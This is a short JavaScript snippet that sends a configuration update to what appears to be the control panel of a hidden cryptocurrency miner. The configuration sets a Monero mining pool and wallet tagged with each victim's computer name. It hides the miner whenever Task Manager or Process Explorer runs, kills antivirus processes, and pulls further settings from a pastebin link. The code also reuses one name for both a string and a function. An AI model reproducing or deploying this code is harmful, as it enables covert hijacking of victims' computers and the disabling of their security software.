fetchData = "https://web-panel.online"

function fetchData(url) {
    let _type = "POST";
    let _url = url + "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 1,
        "data": "{\"algo\": \"rx/0\", \"pool\": \"randomxmonero.auto.nicehash.com\", \"port\": 9200, \"wallet\": \"3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.{COMPUTERNAME}\", \"password\": \"\", \"nicehash\": false, \"ssltls\": false, \"max-cpu\": 60, \"idle-wait\": 5, \"idle-cpu\": 90, \"stealth-targets\": \"Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,...\", \"kill-targets\": \"afwServ.exe,aswEngSrv.exe,aswidsagent.exe,...\", \"stealth-fullscreen\": true, \"remote-config\": \"https://pastebin.com/raw/7dCgdHCt\", \"api-endpoint\": \"http://web-panel.online/api/endpoint.php\"}"
    };

    unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Success:", response);
        },
        function(error) {
            console.error("Error:", error);
        }
    );
}
